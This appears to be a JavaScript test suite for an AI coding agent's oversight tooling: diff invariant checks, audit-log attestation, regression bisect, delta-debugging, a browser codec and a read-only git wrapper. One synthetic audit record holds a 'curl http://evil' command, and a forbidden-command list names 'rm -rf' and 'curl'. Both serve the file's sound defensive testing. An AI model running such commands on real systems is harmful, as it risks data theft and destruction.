  // (.nexus/invariants.json) before a turn is accepted. Pure engine over a parsed diff.
  group("invariants (agent diff-lint / invariants-as-code)");
  try {
    const IV = require("../lib/nexus/invariants");

    // --- parseDiff: unified git diff -> structured per-file added/removed with NEW line numbers ---
    const sampleDiff = [
      "diff --git a/src/app.js b/src/app.js",
      "index 111..222 100644",
      "--- a/src/app.js",
      "+++ b/src/app.js",
      "@@ -10,2 +10,4 @@ function go() {",
      " keep();",
      "+  console.log('debug here');",
      "+  // TODO: finish this",
      " more();",
      "-  oldline();",
      "diff --git a/new.js b/new.js",
      "new file mode 100644",
      "--- /dev/null",
      "+++ b/new.js",
      "@@ -0,0 +1,2 @@",
      "+export const x = 1;",
      "+export const y = 2;",
      "diff --git a/gone.js b/gone.js",
      "deleted file mode 100644",
      "--- a/gone.js",
      "+++ /dev/null",
      "@@ -1,1 +0,0 @@",
      "-was here",
    ].join("\n");
    const files = IV.parseDiff(sampleDiff);
    ok("parseDiff splits every changed file", files.length === 3 && files.map((f) => f.path).join(",") === "src/app.js,new.js,gone.js");
    ok("parseDiff marks a new file A, a deleted file D, a modified file M", files[0].status === "M" && files[1].status === "A" && files[2].status === "D");
    ok("parseDiff collects added lines with correct NEW-file line numbers", files[0].added.length === 2 && files[0].added[0].n === 11 && files[0].added[1].n === 12);
    ok("parseDiff collects removed lines", files[0].removed.length === 1 && files[0].removed[0] === "  oldline();");

    // --- noDebug: only ADDED debug lines are flagged ---
    const dbg = IV.checkInvariants(files, { noDebug: true });
    ok("noDebug flags an added console.log", !dbg.ok && dbg.violations.some((v) => v.rule === "noDebug" && v.path === "src/app.js" && v.line === 11));

    // --- noNewMarkers: only ADDED TODO/FIXME etc are flagged (pre-existing debt untouched) ---
    const mk = IV.checkInvariants(files, { noNewMarkers: true });
    ok("noNewMarkers flags an added TODO at its line", !mk.ok && mk.violations.some((v) => v.rule === "noNewMarkers" && v.line === 12));
    const noMk = IV.checkInvariants([{ path: "x.js", status: "M", added: [{ n: 1, text: "fine();" }], removed: ["// TODO old"] }], { noNewMarkers: true });
    ok("noNewMarkers ignores a marker that was only REMOVED/pre-existing", noMk.ok === true);
    const emptyMk = IV.checkInvariants([{ path: "x.js", status: "M", added: [{ n: 1, text: "const z = 1;" }], removed: [] }], { noNewMarkers: [] });
    ok("noNewMarkers:[] matches nothing (never /\\b()\\b/ flagging every line)", emptyMk.ok === true);

    // --- parseDiff: an added/removed line whose text begins with "++ "/"-- " is body, not a header ---
    const trickyDiff = [
      "diff --git a/m.md b/m.md", "--- a/m.md", "+++ b/m.md",
      "@@ -1,1 +1,3 @@", " keep", "+++ a header-looking added line", "+normal add",
    ].join("\n");
    const tf = IV.parseDiff(trickyDiff)[0];
    ok("parseDiff keeps an added line that reads like a +++ header", tf.added.length === 2 && tf.added[0].text === "++ a header-looking added line" && tf.added[0].n === 2 && tf.added[1].n === 3);

    // --- allowPaths / forbidPaths with globs ---
    const allow = IV.checkInvariants(files, { allowPaths: ["src/**"] });
    ok("allowPaths flags files outside the allowed globs", !allow.ok && allow.violations.some((v) => v.rule === "allowPaths" && v.path === "new.js"));
    const forbid = IV.checkInvariants(files, { forbidPaths: ["**/gone.js"] });
    ok("forbidPaths flags a touched protected path", !forbid.ok && forbid.violations.some((v) => v.rule === "forbidPaths" && v.path === "gone.js"));

    // --- noDelete: deleting a guarded path is a violation; deleting anything else is fine ---
    const del = IV.checkInvariants(files, { noDelete: ["**/*.js"] });
    ok("noDelete flags a deleted guarded file", !del.ok && del.violations.some((v) => v.rule === "noDelete" && v.path === "gone.js"));

    // --- maxFiles ceiling ---
    const mx = IV.checkInvariants(files, { maxFiles: 2 });
    ok("maxFiles flags too many changed files", !mx.ok && mx.violations.some((v) => v.rule === "maxFiles"));
    ok("maxFiles passes when under the ceiling", IV.checkInvariants(files, { maxFiles: 5 }).ok === true);

    // --- noNewDeps: an added line in a dependency manifest is flagged; structure/comments are not ---
    const depDiff = IV.parseDiff([
      "diff --git a/package.json b/package.json",
      "--- a/package.json",
      "+++ b/package.json",
      "@@ -2,1 +2,3 @@",
      '+    "left-pad": "^1.0.0",',
      "+  }",
    ].join("\n"));
    const dep = IV.checkInvariants(depDiff, { noNewDeps: true });
    ok("noNewDeps flags an added dependency entry but not the closing brace", !dep.ok && dep.violations.filter((v) => v.rule === "noNewDeps").length === 1);

    // --- forbidAdded: custom regex over added lines ---
    const fa = IV.checkInvariants(files, { forbidAdded: ["export const"] });
    ok("forbidAdded flags added lines matching a custom pattern", !fa.ok && fa.violations.filter((v) => v.rule === "forbidAdded").length === 2);

    // --- requireTestWithSrc ratchet ---
    const ratchet = IV.checkInvariants([{ path: "src/a.js", status: "M", added: [], removed: [] }], { requireTestWithSrc: true });
    ok("requireTestWithSrc flags source change with no test change", !ratchet.ok && ratchet.violations.some((v) => v.rule === "requireTestWithSrc"));
    const ratchetOk = IV.checkInvariants([{ path: "src/a.js", status: "M", added: [], removed: [] }, { path: "test/a.test.js", status: "M", added: [], removed: [] }], { requireTestWithSrc: true });
    ok("requireTestWithSrc passes when a test file also changed", ratchetOk.ok === true);

    // --- a clean diff against the same rules passes and reports which rules ran ---
    const clean = IV.checkInvariants([{ path: "src/ok.js", status: "M", added: [{ n: 1, text: "const z = 1;" }], removed: [] }], { noDebug: true, noNewMarkers: true, allowPaths: ["src/**"] });
    ok("a clean diff passes and lists the rules checked", clean.ok === true && clean.checked.length === 3 && clean.violations.length === 0);

    // --- fileFromNewContent models an untracked file as all-added ---
    const unt = IV.fileFromNewContent("brand.js", "console.log('x')\nok()");
    ok("fileFromNewContent marks an untracked file A with every line added", unt.status === "A" && unt.added.length === 2 && unt.added[0].n === 1);

    // --- wiring entry: refuses when no rules are configured (injected deps, no real git) ---
    const noRules = IV.invariantsTool({}, "/nonexistent-" + Date.now(), { fs: { readFileSync() { throw new Error("none"); } } });
    ok("invariantsTool refuses with guidance when no invariants are configured", noRules && /no invariants configured/.test(noRules.error));
    // wiring entry: with inline rules + an injected fake git/fs, it lints a synthetic diff
    const fakeCp = { execSync(cmd) { if (/git diff HEAD/.test(cmd)) return sampleDiff; if (/ls-files/.test(cmd)) return ""; return ""; } };
    const wired = IV.invariantsTool({ rules: { noDebug: true } }, "/repo", { cp: fakeCp, fs: { readFileSync() { throw new Error("n/a"); }, statSync() { return { size: 0 }; } }, path: require("path") });
    ok("invariantsTool runs the engine over the live diff and returns violations + a summary", !wired.ok && wired.violations.some((v) => v.rule === "noDebug") && /invariant violation/.test(wired.summary));
  } catch (e) { ok("invariants test threw: " + (e && e.message), false); }

  // attest — capability attestation: summarize the hash-chained audit log into a manifest and
  // prove declared claims against it ("zero network", "only wrote src/**", "never deleted").
  group("attest (capability attestation from the audit log)");
  try {
    const AT = require("../lib/nexus/attest");
    const recs = [
      { seq: 0, ts: "2026-10-08T10:00:00Z", engine: "ollama", tool: "read_file", path: "src/a.js", status: "ok" },
      { seq: 1, ts: "2026-10-08T10:00:01Z", engine: "ollama", tool: "write_file", path: "src/a.js", status: "ok" },
      { seq: 2, ts: "2026-10-08T10:00:02Z", engine: "ollama", tool: "edit_file", path: "src/b.js", status: "ok" },
      { seq: 3, ts: "2026-10-08T10:00:03Z", engine: "ollama", tool: "run_command", cmd: "npm test", status: "ok" },
      { seq: 4, ts: "2026-10-08T10:00:04Z", engine: "ollama", tool: "delete", path: "tmp/x", status: "blocked", reason: "protected path" },
      { seq: 5, ts: "2026-10-08T10:00:05Z", engine: "ollama", tool: "run_command", cmd: "git status", status: "ok" },
    ];
    const m = AT.buildManifest(recs);
    ok("manifest counts written files (edit + write), de-duped and sorted", JSON.stringify(m.writes) === JSON.stringify(["src/a.js", "src/b.js"]));
    ok("manifest lists the commands that ran", m.commands.length === 2 && m.commands[0].cmd === "npm test");
    ok("manifest reports NO network when no network tool ran", m.touchedNetwork === false && m.network.length === 0);
    ok("a blocked action is NOT counted as an effective action (it never happened)", m.deletes.length === 0 && m.blocked.length === 1 && m.blocked[0].tool === "delete");
    ok("manifest records engines and a seq range", JSON.stringify(m.engines) === JSON.stringify(["ollama"]) && m.seqRange.to === 5);

    // network is surfaced when a network tool did run
    const mNet = AT.buildManifest(recs.concat([{ seq: 6, tool: "http_fetch", status: "ok" }]));
    ok("manifest flags that the network was touched when a fetch ran", mNet.touchedNetwork === true && mNet.network[0].tool === "http_fetch");

    // --- claim checking ---
    const pass = AT.checkClaims(m, { noNetwork: true, noDelete: true, onlyPaths: ["src/**"], maxWrites: 5 });
    ok("claims PASS: no network, no delete, only src/**, under the write cap", pass.ok === true && pass.claims.every((c) => c.pass) && pass.checked === 4);

    const failPath = AT.checkClaims(AT.buildManifest(recs.concat([{ seq: 7, tool: "write_file", path: "secrets/key.txt", status: "ok" }])), { onlyPaths: ["src/**"] });
    ok("claim FAILS when a write lands outside the allowed paths, with evidence", failPath.ok === false && /secrets\/key\.txt/.test(failPath.claims[0].detail));

    const failNet = AT.checkClaims(mNet, { noNetwork: true });
    ok("claim FAILS when the network was touched", failNet.ok === false && /network invocation/.test(failNet.claims[0].detail));

    const cmdClaim = AT.checkClaims(m, { noCommands: ["rm -rf", "curl"] });
    ok("noCommands PASSES when no command matched the forbidden patterns", cmdClaim.ok === true);
    const cmdFail = AT.checkClaims(AT.buildManifest(recs.concat([{ seq: 8, tool: "run_command", cmd: "curl http://evil", status: "ok" }])), { noCommands: ["curl"] });
    ok("noCommands FAILS and names the offending command", cmdFail.ok === false && /curl http:\/\/evil/.test(cmdFail.claims[0].detail));

    const unknown = AT.checkClaims(m, { noTelepathy: true });
    ok("an unknown claim is reported as a failure (a typo can't masquerade as a pass)", unknown.ok === false && /unknown claim/.test(unknown.claims[0].detail));

    // chainVerified reads the wiring-attached chain status
    const chainOk = AT.checkClaims(Object.assign(AT.buildManifest(recs), { _chain: { ok: true, count: 6 } }), { chainVerified: true });
    ok("chainVerified passes when the attached chain is intact", chainOk.ok === true && /verified/.test(chainOk.claims[0].detail));
    const chainBad = AT.checkClaims(Object.assign(AT.buildManifest(recs), { _chain: { ok: false, reason: "tampered" } }), { chainVerified: true });
    ok("chainVerified fails when the chain is broken", chainBad.ok === false && /BROKEN/.test(chainBad.claims[0].detail));

    // --- wiring entry with injected fs + auditVerify (no real repo needed) ---
    const jsonl = recs.map((r) => JSON.stringify(r)).join("\n") + "\n";
    const fakeFs = { readFileSync() { return jsonl; } };
    const wired = AT.attestTool({ claims: { noNetwork: true, onlyPaths: ["src/**"] } }, "/repo", { fs: fakeFs, path: require("path"), auditVerify: () => ({ ok: true, count: 6 }) });
    ok("attestTool builds a manifest, verifies the chain and checks claims", wired.manifest.records === 6 && wired.manifest.chain.verified === true && wired.claims.ok === true && /audited action/.test(wired.summary));
    const noLog = AT.attestTool({}, "/repo", { fs: { readFileSync() { throw new Error("ENOENT"); } }, path: require("path"), auditVerify: () => ({ ok: true, count: 0, empty: true }) });
    ok("attestTool explains when there is no audit trail yet", noLog && /no audit trail/.test(noLog.error));
    // `since` scopes the manifest to this run's records
    const scoped = AT.attestTool({ since: 5 }, "/repo", { fs: fakeFs, path: require("path"), auditVerify: () => ({ ok: true, count: 6 }) });
    ok("attestTool 'since' scopes the manifest to recent records", scoped.manifest.records === 1 && scoped.manifest.commands[0].cmd === "git status");
  } catch (e) { ok("attest test threw: " + (e && e.message), false); }

  // bisect — regression bisect over the agent's per-turn checkpoints. The pure driver finds the
  // good->bad boundary with ~log2(n) probes; attribution maps it to the culprit turn.
  group("bisect (regression bisect over per-turn checkpoints)");
  try {
    const BS = require("../lib/nexus/bisect");

    // --- pure driver: monotonic good...good,bad...bad, boundary at a known index ---
    const runWithOracle = async (n, firstBadIdx) => {
      const probe = async (i) => (i >= firstBadIdx ? "bad" : "good");
      return await BS.bisectRun(n, probe);
    };
    const r7 = await runWithOracle(16, 7);
    ok("bisectRun finds the exact first-bad index", r7.status === "found" && r7.firstBad === 7);
    ok("bisectRun converges in logarithmic probes (not linear)", r7.steps <= 7 && r7.steps >= 3);
    // every probe below the boundary is good, at/above is bad (sanity on the oracle + driver)
    ok("bisectRun's probe log is consistent with the boundary", r7.log.every((e) => (e.index >= 7) === (e.verdict === "bad")));

    // boundary at the very end (only the current state is bad) and just after the start
    const rEnd = await runWithOracle(10, 9);
    ok("bisectRun handles a regression only in the latest state", rEnd.status === "found" && rEnd.firstBad === 9);
    const rNear = await runWithOracle(10, 1);
    ok("bisectRun handles a regression introduced by the very first turn", rNear.status === "found" && rNear.firstBad === 1);

    // degenerate cases
    const good = await BS.bisectRun(10, async () => "good");
    ok("bisectRun reports no-regression when the current state passes", good.status === "no-regression" && good.steps === 2);
    const badStart = await BS.bisectRun(10, async () => "bad");
    ok("bisectRun reports bad-from-start when even the earliest state fails", badStart.status === "bad-from-start" && badStart.firstBad === 0);
    const tiny = await BS.bisectRun(1, async () => "bad");
    ok("bisectRun refuses with <2 states", tiny.status === "insufficient");

    // the boundary search is deterministic: same oracle -> identical probe sequence
    const a1 = await runWithOracle(32, 20), a2 = await runWithOracle(32, 20);
    ok("bisect is deterministic (identical probe sequence for the same timeline)", JSON.stringify(a1.log) === JSON.stringify(a2.log));

    // --- attribution: boundary -> culprit turn ---
    const cps = [
      { tree: "t0", label: "set up module", ts: 1, paths: ["a.js"] },
      { tree: "t1", label: "add feature X", ts: 2, paths: ["a.js", "b.js"] },
      { tree: "t2", label: "refactor helper", ts: 3, paths: ["b.js"] },
    ]; // states: 0..2 checkpoints, 3 = current
    const cul = BS.attributeCulprit({ status: "found", firstBad: 2, steps: 4, log: [] }, cps);
    ok("attributeCulprit blames the turn between the last-good and first-bad checkpoint", cul.found && cul.culpritCheckpoint === 1 && cul.turn === "add feature X");
    ok("attributeCulprit reports the culprit's changed paths", cul.paths.join(",") === "a.js,b.js" && /add feature X/.test(cul.reason));
    const culLast = BS.attributeCulprit({ status: "found", firstBad: 3 }, cps);
    ok("attributeCulprit blames the most recent turn when only the current state is bad", culLast.found && culLast.turn === "refactor helper");
    const culPre = BS.attributeCulprit({ status: "bad-from-start", firstBad: 0 }, cps);
    ok("attributeCulprit flags a pre-existing break (predates the timeline)", culPre.found === false && culPre.preExisting === true);
    const culNone = BS.attributeCulprit({ status: "no-regression" }, cps);
    ok("attributeCulprit reports nothing to blame when there's no regression", culNone.found === false && /no regression/.test(culNone.reason));

    // --- orchestration with injected fakes: restore+test, culprit found, working tree restored ---
    // Fake world: the "add feature X" turn introduced the break. A checkpoint tree is the state
    // BEFORE its labelled turn, so the break first shows in t2 (the snapshot taken before the
    // NEXT turn) and in the current state; t0/t1 are still good. Blame therefore falls on the
    // turn recorded at checkpoint index 1 ("add feature X").
    const badTrees = new Set(["t2", "SNAP"]); // SNAP = current state is bad
    let restores = [], tested = [];
    const fakeDeps = {
      loadCheckpoints: () => cps,
      detectTest: () => "npm test",
      snapshot: () => "SNAP",
      restore: (tree) => { restores.push(tree); return true; },
      runTest: async () => { const cur = restores[restores.length - 1]; tested.push(cur); return { code: badTrees.has(cur) ? 1 : 0 }; },
    };
    const res = await BS.bisectTool({}, "/repo", fakeDeps);
    ok("bisectTool isolates the culprit turn via restore+test", res.status === "found" && res.culprit.found && res.culprit.turn === "add feature X");
    ok("bisectTool restores the working tree to the starting snapshot at the end", restores[restores.length - 1] === "SNAP" && res.restored === true);
    ok("bisectTool reports the test command and a human summary", res.testCommand === "npm test" && /Regression isolated/.test(res.summary));

    const resNoCp = await BS.bisectTool({}, "/repo", { loadCheckpoints: () => [], detectTest: () => "npm test" });
    ok("bisectTool refuses when there is no checkpoint timeline", resNoCp && /no checkpoint timeline/.test(resNoCp.error));
    const resNoTest = await BS.bisectTool({}, "/repo", { loadCheckpoints: () => cps, detectTest: () => null, restore: () => true, runTest: async () => ({ code: 0 }) });
    ok("bisectTool refuses when no test command is available", resNoTest && /no test command/.test(resNoTest.error));

    // --- persistence round-trip (injected in-memory fs) ---
    let store = {};
    const memfs = {
      mkdirSync() {},
      appendFileSync(p, s) { store[p] = (store[p] || "") + s; },
      readFileSync(p) { if (store[p] == null) throw new Error("ENOENT"); return store[p]; },
      writeFileSync(p, s) { store[p] = s; },
    };
    const memdeps = { fs: memfs, path: require("path") };
    ok("persistCheckpoint stores a path-scoped checkpoint", BS.persistCheckpoint("/repo", { tree: "tX", label: "do a thing", ts: 5, paths: ["x.js"] }, memdeps) === true);
    ok("persistCheckpoint skips a checkpoint with no changed paths (not bisectable)", BS.persistCheckpoint("/repo", { tree: "tY", label: "noop", ts: 6, paths: [] }, memdeps) === false);
    const loaded = BS.loadCheckpoints("/repo", memdeps);
    ok("loadCheckpoints reads back exactly the persisted, bisectable checkpoints", loaded.length === 1 && loaded[0].tree === "tX" && loaded[0].label === "do a thing");
  } catch (e) { ok("bisect test threw: " + (e && e.message), false); }

  // explain-break — instant "git blame for the agent's turns": correlate a failing test to the
  // turn whose changes most likely caused it, with no test execution. Pure, deterministic.
  group("explain-break (blame the turn that broke the test)");
  try {
    const EB = require("../lib/nexus/explainbreak");

    // extractRefs pulls referenced file paths (with line) and candidate symbols out of output.
    const refs = EB.extractRefs("AssertionError: expected parseConfig to return 2\n    at Object.<anonymous> (src/config.js:42:10)\n    at Module._compile (node:internal)");
    ok("extractRefs captures a referenced file path and line", refs.paths.some((p) => p.path === "src/config.js" && p.line === 42));
    ok("extractRefs captures a meaningful symbol and drops stopwords", refs.symbols.includes("parseConfig") && !refs.symbols.includes("expected"));
    ok("extractRefs ignores urls, not file paths", !refs.paths.some((p) => /^https?:/.test(p.path)));

    // samePath comparison modes
    ok("samePath detects an exact match", EB.samePath("./src/a.js", "src/a.js") === "exact");
    ok("samePath detects a suffix match", EB.samePath("pkg/src/a.js", "src/a.js") === "suffix");
    ok("samePath detects a basename-only match", EB.samePath("x/a.js", "y/a.js") === "base");
    ok("samePath returns null for unrelated paths", EB.samePath("a.js", "b.js") === null);

    // scoreTurns: the turn that changed the file named in the failure ranks first.
    const turns = [
      { label: "scaffold project", ts: 1, paths: ["README.md", "package.json"] },
      { label: "implement parseConfig", ts: 2, paths: ["src/config.js"] },
      { label: "tweak styles", ts: 3, paths: ["src/style.css"] },
    ];
    const ranked = EB.scoreTurns(refs, turns);
    ok("scoreTurns ranks the turn that touched the referenced file first", ranked[0].turn === "implement parseConfig" && ranked[0].score >= 100);
    ok("scoreTurns records the evidence for the top suspect", /config\.js/.test(ranked[0].reasons[0]));
    ok("an unrelated turn scores far lower", ranked[ranked.length - 1].score < ranked[0].score);

    // symbol-only correlation (no path match) still produces a weaker signal
    const symTurns = [{ label: "add parseConfig helper", ts: 1, paths: ["lib/helpers.js"] }, { label: "docs", ts: 2, paths: ["README.md"] }];
    const symRanked = EB.scoreTurns(refs, symTurns);
    ok("scoreTurns uses symbol overlap when there's no path match", symRanked[0].turn === "add parseConfig helper" && symRanked[0].score > 0 && symRanked[0].score < 100);

    // explainBreak end-to-end: confident when a filename correlates, with a bisect pointer.
    const verdict = EB.explainBreak("FAIL src/config.js:42 — parseConfig returned 1, expected 2", turns);
    ok("explainBreak is confident and names the culprit turn when a file correlates", verdict.confident === true && /implement parseConfig/.test(verdict.summary) && /bisect/.test(verdict.summary));
    ok("explainBreak surfaces the referenced paths and the diagnose category", verdict.referencedPaths.some((p) => /config\.js/.test(p)) && verdict.category === "test-failure");

    // not confident when nothing overlaps — it points at bisect rather than guessing.
    const vague = EB.explainBreak("Segmentation fault (core dumped)", turns);
    ok("explainBreak declines to guess when there's no overlap and points to bisect", vague.confident === false && /bisect/.test(vague.summary));

    // --- wiring: provided output + injected timeline ---
    const wired = await EB.explainBreakTool({ output: "FAIL at src/config.js:42 parseConfig" }, "/repo", { loadCheckpoints: () => turns });
    ok("explainBreakTool correlates provided output against the injected timeline", wired.confident === true && wired.suspects[0].turn === "implement parseConfig");
    // wiring: no output given -> runs the test once; a passing test means nothing to explain
    const passing = await EB.explainBreakTool({}, "/repo", { loadCheckpoints: () => turns, detectTest: () => "npm test", runTest: async () => ({ code: 0, output: "ok" }) });
    ok("explainBreakTool reports 'passing' when the captured test actually passes", passing.status === "passing");
    // wiring: no output and no runner -> clear guidance
    const needOut = await EB.explainBreakTool({}, "/repo", { loadCheckpoints: () => turns });
    ok("explainBreakTool asks for the failing output when it can't capture one", needOut && /needs the failing test output/.test(needOut.error));
    const noCps = await EB.explainBreakTool({ output: "FAIL src/config.js:42" }, "/repo", { loadCheckpoints: () => [] });
    ok("explainBreakTool refuses with no timeline to attribute against", noCps && /no checkpoint timeline/.test(noCps.error));
  } catch (e) { ok("explain-break test threw: " + (e && e.message), false); }

  // shrink — delta-debug (ddmin) the agent's own edits to the minimal breaking subset of files.
  // The pure ddmin engine is tested with a synthetic oracle; orchestration with a fake git world.
  group("shrink (delta-debug the agent's edits to the minimal breaking set)");
  try {
    const SH = require("../lib/nexus/shrink");

    // --- splitChunks partitions evenly and loses nothing ---
    const chunks = SH.splitChunks(["a", "b", "c", "d", "e"], 2);
    ok("splitChunks splits into n chunks covering every element once", chunks.length === 2 && chunks.flat().join("") === "abcde");

    // --- pure ddmin: failure requires a specific subset of units to be present ---
    const needs = (required) => async (subset) => required.every((r) => subset.includes(r)) ? "fail" : "pass";
    const r1 = await SH.ddmin(["a", "b", "c", "d", "e", "f", "g", "h"], needs(["c", "f"]));
    ok("ddmin isolates the exact minimal failing subset", JSON.stringify(r1.minimal.slice().sort()) === JSON.stringify(["c", "f"]));
    ok("ddmin result is 1-minimal (every unit is load-bearing)", r1.minimal.length === 2);
    ok("ddmin memoises so it never explodes past O(n^2) tests", r1.tests <= (8 * 8 + 3 * 8));

    // single required unit
    const r2 = await SH.ddmin(["a", "b", "c", "d"], needs(["b"]));
    ok("ddmin finds a single-file culprit", JSON.stringify(r2.minimal) === JSON.stringify(["b"]));

    // when ALL units are required, ddmin returns the whole set
    const r3 = await SH.ddmin(["a", "b", "c"], needs(["a", "b", "c"]));
    ok("ddmin returns the full set when every change is needed", r3.minimal.length === 3);

    // ddmin is deterministic: identical oracle -> identical minimal result
    const d1 = await SH.ddmin(["a", "b", "c", "d", "e", "f"], needs(["b", "e"]));
    const d2 = await SH.ddmin(["a", "b", "c", "d", "e", "f"], needs(["b", "e"]));
    ok("ddmin is deterministic", JSON.stringify(d1.minimal) === JSON.stringify(d2.minimal));

    // "unresolved" (a different failure from an invalid subset) must NOT count as reproducing
    const picky = async (subset) => { if (!subset.includes("x")) return "pass"; if (subset.length > 2) return "unresolved"; return "fail"; };
    const r4 = await SH.ddmin(["x", "y", "z", "w"], picky);
    ok("ddmin ignores unresolved (different-failure) subsets and still minimises", r4.minimal.includes("x") && r4.minimal.length <= 2);

    // --- sameFailure signature matching ---
    ok("sameFailure matches same category + overlapping file", SH.sameFailure({ category: "test-failure", line: "at src/a.js:4" }, { category: "test-failure", line: "src/a.js fails" }) === true);
    ok("sameFailure rejects a different category", SH.sameFailure({ category: "syntax-error", line: "a.js" }, { category: "test-failure", line: "a.js" }) === false);

    // --- orchestration with a fake git world: the break needs files B and D at their new version ---
    const cps = [
      { tree: "base", label: "baseline", ts: 1, paths: ["A.js"] },
      { tree: "t1", label: "turn1", ts: 2, paths: ["B.js", "C.js"] },
      { tree: "t2", label: "turn2", ts: 3, paths: ["D.js", "E.js"] },
    ];
    const breakingSet = new Set(["B.js", "D.js"]);
    let current = new Set();          // files currently at their NEW (current) version
    const fakeDeps = {
      loadCheckpoints: () => cps,
      detectTest: () => "npm test",
      snapshot: () => "SNAP",
      restore: (tree, paths) => { if (tree === "base") { for (const p of paths) current.delete(p); } else { for (const p of paths) current.add(p); } return true; },
      runTest: async () => { const reproduces = [...breakingSet].every((f) => current.has(f)); return reproduces ? { code: 1, output: "AssertionError in test (feature regressed)" } : { code: 0, output: "ok" }; },
      diagnose: () => ({ category: "test-failure", line: "" }),
    };
    const res = await SH.shrinkTool({}, "/repo", fakeDeps);
    ok("shrinkTool isolates the minimal breaking file set", res.status === "found" && JSON.stringify(res.minimal.slice().sort()) === JSON.stringify(["B.js", "D.js"]));
    ok("shrinkTool reports the innocent (droppable) changed files", res.innocent.slice().sort().join(",") === "A.js,C.js,E.js");
    ok("shrinkTool restores the working tree to the current snapshot at the end", current.has("B.js") && current.has("D.js") && res.restored === true);
    ok("shrinkTool summarises the minimal set and the test command", /Minimal breaking change set/.test(res.summary) && res.testCommand === "npm test");

    // passing current state -> nothing to shrink
    const breakingNone = new Set(["ZZ"]); // never reproduces
    let cur2 = new Set();
    const passDeps = Object.assign({}, fakeDeps, { restore: (tree, paths) => { if (tree === "base") { for (const p of paths) cur2.delete(p); } else { for (const p of paths) cur2.add(p); } return true; }, runTest: async () => ([...breakingNone].every((f) => cur2.has(f)) ? { code: 1, output: "x" } : { code: 0, output: "ok" }) });
    const resPass = await SH.shrinkTool({}, "/repo", passDeps);
    ok("shrinkTool reports nothing to shrink when the current state passes", resPass.status === "passing");

    // pre-existing break (baseline already fails) -> bail
    let cur3 = new Set();
    const preDeps = Object.assign({}, fakeDeps, { restore: (tree, paths) => { if (tree === "base") { for (const p of paths) cur3.delete(p); } else { for (const p of paths) cur3.add(p); } return true; }, runTest: async () => ({ code: 1, output: "AssertionError in test" }) });
    const resPre = await SH.shrinkTool({}, "/repo", preDeps);
    ok("shrinkTool detects a pre-existing break and bails", resPre.status === "pre-existing");

    const resNoCp = await SH.shrinkTool({}, "/repo", { loadCheckpoints: () => [], restore: () => true, runTest: async () => ({ code: 1 }) });
    ok("shrinkTool refuses with no checkpoint timeline", resNoCp && /no checkpoint timeline/.test(resNoCp.error));
    const resCap = await SH.shrinkTool({ max: 1 }, "/repo", { loadCheckpoints: () => cps, restore: () => true, runTest: async () => ({ code: 1 }), detectTest: () => "npm test" });
    ok("shrinkTool refuses when there are more changed files than the cap", resCap && /too many changed files/.test(resCap.error));
  } catch (e) { ok("shrink test threw: " + (e && e.message), false); }

  // agentic browser (CDP WebSocket client) — frame codec, target selection, dispatch shape.
  try {
    const B = require("../lib/nexus/browser");
    const round = (s) => { const f = B.parseFrame(B.buildFrame(s)); return f && f.payload.toString("utf8"); };
    ok("ws frame round-trips a short string", round("hello cdp") === "hello cdp");
    ok("ws frame round-trips a 300-byte payload (16-bit length)", round("x".repeat(300)) === "x".repeat(300));
    ok("ws frame round-trips a 70KB payload (64-bit length)", round("y".repeat(70000)) === "y".repeat(70000));
    ok("parseFrame returns null on an incomplete buffer", B.parseFrame(Buffer.from([0x81])) === null);
    ok("buildFrame masks client->server frames (mask bit set)", (B.buildFrame("a")[1] & 0x80) !== 0);
    const targets = [{ type: "page", id: "A", title: "GitHub", url: "https://github.com/x" }, { type: "page", id: "B", title: "Mail", url: "https://mail.example/inbox" }, { type: "background_page", id: "C", url: "chrome://ext" }];
    eq("pickTarget default -> first page", B.pickTarget(targets, "").id, "A");
    eq("pickTarget by index", B.pickTarget(targets, 1).id, "B");
    eq("pickTarget by url substring", B.pickTarget(targets, "mail").id, "B");
    eq("pickTarget by id", B.pickTarget(targets, "C").id, "C");
    ok("pickTarget no match -> null", B.pickTarget(targets, "nope") === null);
    ok("startHint names the chosen port", /9222/.test(B.startHint(9222)));
    ok("browserTool ignores a non-browser name (null)", (await B.browserTool("read_file", {}, ".")) === null);
    const st = await B.browserTool("browser_status", { port: 59997 }, ".");
    ok("browser_status reports unreachable + a how-to-start hint when no debug browser", st && st.reachable === false && /remote-debugging-port/.test(st.hint || ""));
  } catch (e) { ok("browser test threw: " + (e && e.message), false); }

  // native tool loop orchestrator (async, dependency-injected fake model) — proves the
  // edit->run->observe cycle: run tools, feed results back, then finalize.
  try {
    const NT = require("../lib/nexus/native-tools");
    let turn = 0;
    const chat = async (msgs) => {
      turn++;
      return turn === 1
        ? { provider: "ollama", body: { message: { content: "", tool_calls: [
            { function: { name: "read_file", arguments: { path: "a" } } },
            { function: { name: "list_dir", arguments: {} } },
          ] } } }
        : { provider: "ollama", body: { message: { content: "saw " + msgs.filter((m) => m.role === "tool").length + " results" } } };
    };
    const r = await NT.runNativeToolLoop({ chat, dispatch: async (n, args) => n + ":" + JSON.stringify(args), tools: [], maxSteps: 5 });
    ok("native loop: 2 tools then finalizes with results fed back", r.steps === 2 && r.calls.length === 2 && r.finalText === "saw 2 results" && r.calls[0].result === 'read_file:{"path":"a"}');
    const stopped = await NT.runNativeToolLoop({ chat: async () => ({ provider: "ollama", body: { message: { tool_calls: [{ function: { name: "x", arguments: {} } }] } } }), dispatch: async () => "y", tools: [], maxSteps: 3 });
    ok("native loop: respects maxSteps when model never stops", stopped.hitLimit === true && stopped.calls.length === 3);
  } catch (e) { ok("native loop test threw: " + (e && e.message), false); }
  // ===================== git_tool / lint_format / notebook_edit (Oct 2026 batch) =====================
  group("git_tool (read-only structured git)");
  {
    const GT = require("../lib/nexus/git-tool");
    ok("build status cmd", GT.buildGitCommand("status", {}).cmd === "git status --porcelain=v1 --branch");
    ok("build log cmd clamps count + adds path", /-n 5/.test(GT.buildGitCommand("log", { count: 5, path: "a.js" }).cmd) && /-- 'a.js'/.test(GT.buildGitCommand("log", { count: 5, path: "a.js" }).cmd));
    ok("log count is clamped to <=200", /-n 200/.test(GT.buildGitCommand("log", { count: 99999 }).cmd));
    ok("diff --staged", /--staged/.test(GT.buildGitCommand("diff", { staged: true }).cmd));
    ok("blame needs a path", /needs a 'path'/.test(GT.buildGitCommand("blame", {}).error));
    ok("write op 'commit' is refused", /read-only/.test(GT.buildGitCommand("commit", {}).error));
    ok("write op 'push' is refused", /read-only/.test(GT.buildGitCommand("push", {}).error));
    ok("unknown op reports allowed ops", /unknown git op/.test(GT.buildGitCommand("frobnicate", {}).error));
    ok("newline in ref is rejected", /invalid git argument/.test(GT.buildGitCommand("show", { ref: "a\nb" }).error));
    ok("shq escapes single quotes", GT.shq("a'b") === "'a'\\''b'");
